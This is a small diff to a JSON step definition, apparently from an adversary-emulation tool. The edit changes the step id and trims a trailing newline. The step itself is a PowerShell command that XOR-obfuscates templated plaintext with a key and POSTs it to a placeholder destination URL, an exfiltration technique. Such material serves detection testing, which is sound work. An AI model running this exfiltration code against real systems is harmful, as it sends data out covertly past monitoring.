@@ -7,10 +7,10 @@
   ],
   "steps": [
     {
-      "id": "a2c49260-5461-43da-9e70-235be1782fe9",
+      "id": "0eda626b-3aa3-4ded-aea3-84540436fef7",
       "type": "execute-command",
       "data": {
-        "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n",
+        "command": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive",
         "command_type": "powershell"
       },
       "elevation_required": false
